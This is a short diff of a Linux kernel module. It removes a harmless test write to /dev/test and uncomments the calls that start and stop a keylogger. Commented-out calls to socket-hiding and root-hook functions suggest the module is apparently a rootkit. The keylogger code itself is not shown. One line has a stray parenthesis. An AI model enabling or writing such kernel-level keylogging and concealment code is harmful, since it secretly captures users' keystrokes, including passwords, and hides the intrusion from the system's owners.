@@ -16,12 +16,7 @@ int init_module(void) {
 
 	// hide_sock();
 	// start_root_hook();
-	// start_key_logger();
-
-	struct file *f = driver_file_open("/dev/test", 0, 0);
-	driver_file_write(f, 0, "Hello", 5);
-	driver_file_close(f);
-
+	start_key_logger();
 	return 0;
 }
 
@@ -29,5 +24,5 @@ int init_module(void) {
 void cleanup_module(void) {
 	// remove_sock_hook());
 	// stop_root_hook();
-	// stop_key_logger();
+	stop_key_logger();
 }
